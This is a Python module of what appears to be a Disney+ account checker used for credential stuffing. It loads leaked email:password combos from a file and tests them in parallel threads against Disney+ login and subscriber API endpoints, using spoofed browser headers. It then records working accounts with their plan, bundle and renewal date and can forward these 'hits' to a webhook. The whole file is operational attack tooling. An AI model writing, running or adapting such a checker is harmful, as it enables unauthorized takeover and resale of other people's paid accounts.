"""

Disney+

"""

import requests, os, time, queue, threading, json
from colorama import Fore, Style, init

from Modules.functions import Functions, Data

# ----------------------------------------- #

cyan = Fore.CYAN
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW

# ----------------------------------------- #

data = Data(0, 0, 0, 0, 0, 0)
func = Functions()

class Checker:
    def __init__(self, threads: int, accounts: list):
        self.threads = threads
        self.accounts = accounts

    def cls(self):
        os.system('cls')

    def load_accounts(self):
        with open('combo.txt', 'r', encoding='utf-8') as f:
            accounts = f.readlines()
        for i in accounts:
            self.accounts.append(i)

        return len(accounts)
    
    # ------------------------------------------- #

    def main(self):
        q = queue.Queue()
        for i in self.accounts:
            p = i.strip()
            acc = p.split(":")
            q.put(acc)

        def login(q):
            while not q.empty():
                try:
                    combo = q.get()
                    username, password = combo
                    acc = f"{username}:{password}"

                    u = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
                    j = {"query":"mutation registerDevice($input: RegisterDeviceInput!) { registerDevice(registerDevice: $input) { grant { grantType assertion } } }","variables":{"input":{"deviceFamily":"browser","applicationRuntime":"chrome","deviceProfile":"windows","deviceLanguage":"en-US","attributes":{"osDeviceIds":[],"manufacturer":"microsoft","model":"null","operatingSystem":"windows","operatingSystemVersion":"10.0","browserName":"chrome","browserVersion":"95.0.4638"} } } }
                    h = {
                        "authority": "disney.api.edge.bamgrid.com",
                        "accept": "application/json",
                        "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                        "authorization": "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
                        "content-type": "application/json",
                        "origin": "https://www.disneyplus.com",
                        "referer": "https://www.disneyplus.com/",
                        "sec-ch-ua-mobile": "?0",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site",
                        "user-agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",  
                        "x-application-version": "1.1.2",
                        "x-bamsdk-client-id": "disney-svod-3d9324fc",
                        "x-bamsdk-platform": "windows",
                        "x-bamsdk-platform-id": "browser",
                        "x-bamsdk-version": "12.0",
                        "x-dss-edge-accept": "vnd.dss.edge+json; version=2"
                    }

                    try:
                        r = requests.post(u, json=j, headers=h)
                        if r.status_code == 403:
                            data.retries += 1
                            print(yellow + f"[{func.timestamp()}] | [!] {acc}")
                            return
                        jr = r.json()
                        tk1 = jr['extensions']['sdk']['token']['accessToken']
                 
                        u2 = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
                        j2 = {"query":" query Check($email: String!) { check(email: $email) { operations nextOperation } }","variables":{"email":f"{username}"} }
                        h2 = {
                            "authority": "disney.api.edge.bamgrid.com",
                            "accept": "application/json",
                            "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                            "authorization": f"{tk1}",
                            "content-type": "application/json",
                            "origin": "https://www.disneyplus.com",
                            "referer": "https://www.disneyplus.com/",
                            "sec-ch-ua-mobile": "?0",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "cross-site",
                            "user-agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
                            "x-application-version": "1.1.2",
                            "x-bamsdk-client-id": "disney-svod-3d9324fc",
                            "x-bamsdk-platform": "windows",
                            "x-bamsdk-platform-id": "browser",
                            "x-bamsdk-version": "12.0",
                            "x-dss-edge-accept": "vnd.dss.edge+json; version=2"
                        }

                        r = requests.post(u2, headers=h2, json=j2)
            
                        if "upstream error with status" in r.text:
                            print(red + f"[{func.timestamp()}] | [-] {acc}")
                            data.bad += 1
                        elif '{"operations":["Register"]' in r.text:
                            print(red + f"[{func.timestamp()}] | [-] {acc}")
                            data.bad += 1
                        elif '{"operations":["RegisterAccount"]' in r.text:
                            print(red + f"[{func.timestamp()}] | [-] {acc}")
                            data.bad += 1
                        elif 'operations":["OTP"]' in r.text:
                            print(red + f"[{func.timestamp()}] | [2FA] {acc}")
                            data.nfa += 1
                        else:
                            u3 = 'https://disney.api.edge.bamgrid.com/v1/public/graphql'
                            j3 = {"query":" mutation login($input: LoginInput!) { login(login: $input) { account { ...account profiles { ...profile } } actionGrant } } fragment account on Account { id attributes { blocks { expiry reason } consentPreferences { dataElements { name value } purposes { consentDate firstTransactionDate id lastTransactionCollectionPointId lastTransactionCollectionPointVersion lastTransactionDate name status totalTransactionCount version } } dssIdentityCreatedAt email emailVerified lastSecurityFlaggedAt locations { manual { country } purchase { country source } registration { geoIp { country } } } securityFlagged tags taxId userVerified } parentalControls { isProfileCreationProtected } flows { star { isOnboarded } } } fragment profile on Profile { id name isAge21Verified attributes { avatar { id userSelected } isDefault kidsModeEnabled languagePreferences { appLanguage playbackLanguage preferAudioDescription preferSDH subtitleAppearance { backgroundColor backgroundOpacity description font size textColor } subtitleLanguage subtitlesEnabled } groupWatch { enabled } parentalControls { kidProofExitEnabled isPinProtected } playbackSettings { autoplay backgroundVideo prefer133 preferImaxEnhancedVersion previewAudioOnHome previewVideoOnHome } } maturityRating { ...maturityRating } flows { star { eligibleForOnboarding isOnboarded } } } fragment maturityRating on MaturityRating { ratingSystem ratingSystemValues contentMaturityRating maxRatingSystemValue isMaxContentMaturityRating } ","variables":{"input":{"email":f"{username}","password":f"{password}"}}}
                            h3 = {
                                "authority": "disney.api.edge.bamgrid.com",
                                "accept": "application/json",
                                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                                "authorization": f"{tk1}",
                                "content-type": "application/json",
                                "origin": "https://www.disneyplus.com",
                                "referer": "https://www.disneyplus.com/",
                                "sec-ch-ua-mobile": "?0",
                                "sec-fetch-dest": "empty",
                                "sec-fetch-mode": "cors",
                                "sec-fetch-site": "cross-site",
                                "user-agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
                                "x-application-version": "1.1.2",
                                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                                "x-bamsdk-platform": "windows",
                                "x-bamsdk-platform-id": "browser",
                                "x-bamsdk-version": "12.0",
                                "x-dss-edge-accept": "vnd.dss.edge+json; version=2"
                            }

                            r3 = requests.post(u3, headers=h3, json=j3)

                            if 'Bad credentials' in r3.text:
                                print(red + Style.NORMAL + f"[{func.timestamp()}] | [-] {acc}")
                                data.bad += 1
                            elif r.status_code == 403:
                                data.retries += 1
                                print(yellow + f"[{func.timestamp()}] | [!] {acc}")
                            elif 'Account is blocked' in r.text:
                                print(red + Style.NORMAL + f"[{func.timestamp()}] | [EXPIRED] {acc}")
                                data.bad += 1
                            else:
                                try:
                                    rj = r3.json()
                                    tk2 = rj['accessToken']

                                    u4 = 'https://disney.api.edge.bamgrid.com/v2/subscribers'
                                    h4 = {
                                        "authority": "disney.api.edge.bamgrid.com",
                                        "accept": "application/json",
                                        "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                                        "authorization": f"{tk2}",
                                        "content-type": "application/json",
                                        "origin": "https://www.disneyplus.com",
                                        "referer": "https://www.disneyplus.com/",
                                        "sec-ch-ua-mobile": "?0",
                                        "sec-fetch-dest": "empty",
                                        "sec-fetch-mode": "cors",
                                        "sec-fetch-site": "cross-site",
                                        "user-agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
                                        "x-application-version": "1.1.2",
                                        "x-bamsdk-client-id": "disney-svod-3d9324fc",
                                        "x-bamsdk-platform": "windows",
                                        "x-bamsdk-platform-id": "browser",
                                        "x-bamsdk-version": "12.0",
                                        "x-dss-edge-accept": "vnd.dss.edge+json; version=2"
                                    }
                                    r4 = requests.get(u4, headers=h4)
                                    rj2 = r4.json()
                                    
                                    try:
                                        status = rj2['subscriberStatus']
                                        if status == 'subscription.not.found':
                                            func.wfree("disney", f"{acc} | Plan --> False")
                                            print(red + f"[{func.timestamp()}] | [FREE] {acc}")
                                            data.free += 1
                                        elif status == 'CHURNED':
                                            print(red + f"[{func.timestamp()}] | [CHURNED] {acc}")
                                            data.bad += 1
                                        else:
                                            plan = rj2['name']
                                            bundle = rj2['bundle']
                                            renew = rj2['nextRenewalDate']
                                            def bool_bundle():
                                                if bundle == 'true':
                                                    return "True ✅"
                                                else:
                                                    return "False ❌"
                        
                                            account = f"{acc} | Plan --> {plan} | Bundle --> {bool_bundle()} | Next Renew --> {renew}"
                                            if func.hook()[0]:
                                                hook = func.hook()[1]
                                                func.send_hit(hook, account)
                                            func.writeh("disney", account)
                                            data.hits += 1     
                                    except:
                                        print(red + f"[{func.timestamp()}] | [-] {acc}")
                                        data.bad += 1
                                except:
                                    print(red + f"[{func.timestamp()}] | [-] {acc}")
                                    data.bad += 1

                    except:
                        data.retries += 1
                        print(yellow + f"[{func.timestamp()}] | [!] {acc}")
                except:
                    data.retries += 1
                    print(yellow + "[!] Invalid Format")

        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=login, args=(q,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()


# ----------------------------------------- #

def disney():
    checker = Checker(0, [])
    checker.cls()

    # ------------------------------------------- #

    try:
        threads = int(input(cyan + "Threads: "))
        checker.threads = threads
        checker.cls()
    except:
        print(red + "[!] Error")
        time.sleep(1.5)
        disney()

    # ------------------------------------------- #

    accounts = checker.load_accounts()
    input(cyan + f"Accounts: {accounts} | Threads: {checker.threads} | Press Enter To Start > ")
    print()

    # ------------------------------------------- #

    checker.main()
    func.notify(func.get_hook(), data.hits)
    input(f"\n{green}- Hits: {data.hits}\n{red}- Bad: {data.bad}\n{red + Style.DIM}- 2FA: {data.nfa}\n- Free: {data.free}\n{yellow + Style.NORMAL}- Retries: {data.retries}\n\n{cyan}Press Enter To Continue > ")
